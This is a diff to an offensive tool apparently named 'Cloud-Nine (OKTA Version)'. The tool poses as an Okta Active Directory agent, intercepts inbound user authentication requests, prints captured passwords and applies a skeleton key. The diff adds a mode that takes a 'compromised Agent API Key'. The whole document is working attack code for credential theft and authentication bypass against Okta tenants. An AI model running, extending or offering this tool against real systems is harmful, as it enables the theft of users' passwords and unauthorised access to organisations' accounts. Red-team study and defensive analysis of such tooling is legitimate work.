@@ -22,7 +22,7 @@ def handleInboundAuth(okta_client, skeleton_key, action):
   m = re.search("<type>([^<]+)", action_response, re.IGNORECASE + re.MULTILINE)
   if m:
     if m.group(1) == "NONE":
-      print("[*] PING Received")
+      print("[*] PING received")
       return
 
     elif m.group(1) == "USER_AUTH":
@@ -36,6 +36,10 @@ def handleInboundAuth(okta_client, skeleton_key, action):
       if pwd:
         password = pwd.group(1)
         print(f"[*] Password: {password}")
+    
+    else:
+      print("[*] Unsupported action received and ignored")
+      return
 
   m = re.search("actionId=\"([^\"]+)", action_response, re.IGNORECASE + re.MULTILINE)
   if m:
@@ -51,12 +55,18 @@ def runWithToken(tenant, skeleton_key, agent_id, app_id, api_key):
       action_response = okta_client.start_action_listening()
       handleInboundAuth(okta_client, skeleton_key, action_response)
         
-
 def runWithOauth(tenant, skeleton_key, code, machine_name, domain_name):
   with okta.OktaADAgent(tenant, code=code, device_name=machine_name, domain=domain_name) as okta_client:
     while running:
       action_response = okta_client.start_action_listening()
       handleInboundAuth(okta_client, skeleton_key, action_response)
+
+def runWithKey(tenant, skeleton_key, agent_id, agent_key, client_id, app_id):
+  with okta.OktaADAgent(tenant, agent_id=agent_id, agent_key=agent_key, client_id=client_id, app_id=app_id) as okta_client:
+    while running:
+      action_response = okta_client.start_action_listening()
+      handleInboundAuth(okta_client, skeleton_key, action_response)
+
 
 if __name__ == "__main__":
   print("Cloud-Nine (OKTA Version)..\n\tby @_xpn_\n")
@@ -77,6 +87,12 @@ if __name__ == "__main__":
   parser_b.add_argument('--machine-name', required=True, help='Name of new Virtual DC Connector')
   parser_b.add_argument('--windows-domain', required=True, help='FQDN of the Windows Domain')
 
+  parser_c = subparsers.add_parser('key', help='Accepts a compromised Agent API Key')
+  parser_c.add_argument('--agent-id', required=True, help='Agent ID')
+  parser_c.add_argument('--agent-key', required=True, help='Agent API Key')
+  parser_c.add_argument('--client-id', required=True, help='Client ID')
+  parser_c.add_argument('--app-id', required=True, help='App ID')
+
   args = parser.parse_args()
 
   # Check which mode we're in
@@ -85,6 +101,9 @@ if __name__ == "__main__":
   
   elif args.command == "oauth":
     runWithOauth(args.tenant_domain, args.skeleton_key, args.code, args.machine_name, args.windows_domain)
+
+  elif args.command == "key":
+    runWithKey(args.tenant_domain, args.skeleton_key, args.agent_id, args.agent_key, args.client_id, args.app_id)
 
   else:
     print("[!] Invalid arguments")
